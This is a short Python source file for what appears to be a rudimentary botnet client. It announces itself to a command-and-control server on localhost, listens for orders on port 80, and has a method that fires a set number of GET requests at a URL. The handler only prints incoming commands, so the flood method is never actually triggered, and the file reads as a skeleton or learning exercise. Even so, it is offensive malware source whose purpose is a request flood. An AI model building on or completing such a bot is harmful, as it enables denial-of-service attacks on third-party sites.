import requests
import socket
import json
import atexit


class Bot:

    def __init__(self, cnc_addr, cnc_port):
        self.address = (cnc_addr, cnc_port)
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.bind(self.address)
        self.socket.listen(10)


    def request_handler(self, req):
        print(req)

    def send_requests(self, url, n):
        for _ in range(n):
            response = requests.get(url)
            print(f"Response status code: {response.status_code}")

    def deamon(self):
        while True:
            client, address = self.socket.accept()
            request = client.recv(1024)
            self.request_handler(request)
            client.close()



CNC_ADDR = "127.0.0.1"
CNC_PORT = 60000


def exit_handler():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((CNC_ADDR, CNC_PORT))
        s.send(b"close")
        print("Connection closed")


if __name__ == '__main__':
    atexit.register(exit_handler)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((CNC_ADDR, CNC_PORT))
        s.send(b"new")
        print("Connected to the Command & Control")
    bot = Bot("127.0.0.1", 80)
    bot.deamon()
